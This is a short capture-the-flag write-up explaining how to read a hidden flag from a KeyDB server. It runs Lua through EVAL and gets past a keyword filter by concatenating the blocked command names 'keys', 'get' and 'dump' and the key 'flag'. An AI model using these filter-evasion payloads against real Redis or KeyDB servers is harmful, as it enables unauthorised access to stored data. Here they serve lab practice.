# Solution

A simple google search about keydb shows it is a fork of redis, which is a kv store db.
redis/keydb lets users upload and execute Lua scripts on the server, we can leverage from the eval() func to execute a lua code on our keydb cli.

https://docs.keydb.dev/docs/commands/#eval

`eval "return KeyDB.call('set','foo','bar')" 0`

this returns 🙀🙀🙀🙀🙀, thats because set and keydb, get, keys, etc.. are filtered.

Since keydb is fitlred we can replace it with redis. no harm in doin that, we already said keydb is a fork of redis.

okay, now how can we bypass "get" and "keys"? you have lua! simply create a local var and concat the two strings "ke" and "ys". now we can list our keys using either:

```
$ eval "local a='ke'; a=a..'ys'; local k=redis.call(a, '*'); return k;" 0
$ eval "local a='ke'; a=a..'ys'; return cjson.encode(redis.call(a, '*'))" 0
``` 

okay we can see the flag, but ig is also filtered. what now? dw, just like we did to "keys", lets create a new local var b to hold the "flag" for us.

```
$ eval "local a='du'; a=a..'mp';local b='fl';b=b..'ag'; local k=redis.call(a, b); return k;" 0
$ eval "local a='ge'; a=a..'t';local b='fl';b=b..'ag'; return cjson.encode(redis.call(a, b))" 0
```

hope there is unintended for this :').